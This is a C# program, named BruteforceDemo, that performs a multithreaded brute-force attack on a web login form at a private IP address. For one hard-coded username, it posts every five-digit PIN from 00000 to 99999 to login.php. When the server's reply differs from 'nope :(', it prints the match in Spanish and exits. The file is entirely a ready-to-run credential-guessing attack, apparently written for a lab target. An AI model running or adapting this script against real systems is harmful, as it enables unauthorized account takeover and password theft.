using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BruteforceDemo
{
    class Program
    {
        static async Task Main(string[] args)
        {
            string ipAddress = "192.168.161.31"; 
            int port = 80;                          
            string username = " Mateo.Jubells";    

            int totalPasswords = 100000;

            int numThreads = 20;
            ManualResetEvent[] doneEvents = new ManualResetEvent[numThreads];

            for (int i = 0; i < numThreads; i++)
            {
                doneEvents[i] = new ManualResetEvent(false);
                ThreadPool.QueueUserWorkItem(async (object threadContext) =>
                {
                    int threadIndex = (int)threadContext;
                    int passwordsPerThread = totalPasswords / numThreads;
                    int start = threadIndex * passwordsPerThread;
                    int end = (threadIndex == numThreads - 1) ? totalPasswords : start + passwordsPerThread;

                    for (int password = start; password < end; password++)
                    {
                        string formattedPassword = password.ToString("D5");
                        string authenticationMessage = $"usern={username}&passw={formattedPassword}";

                        try
                        {
                            using (HttpClient client = new HttpClient())
                            {
                                var content = new StringContent(authenticationMessage, Encoding.UTF8, "application/x-www-form-urlencoded");
                                var response = await client.PostAsync($"http://{ipAddress}:{port}/login.php", content);
                                var responseString = await response.Content.ReadAsStringAsync();

                                Console.WriteLine($"Probando contraseña: {formattedPassword} - Respuesta del servidor: {responseString}");

                                if (responseString != "nope :(")
                                {
                                    Console.WriteLine($"¡Contraseña encontrada! La contraseña es: {formattedPassword}");
                                    Console.WriteLine("Deteniendo el programa.");
                                    Environment.Exit(0); 
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error al conectar al servidor: {ex.Message}");
                        }
                    }

                    doneEvents[threadIndex].Set();
                }, i);
            }

            WaitHandle.WaitAll(doneEvents);

            Console.WriteLine("Fin del programa. Presiona cualquier tecla para salir.");
            Console.ReadKey();
        }
    }
}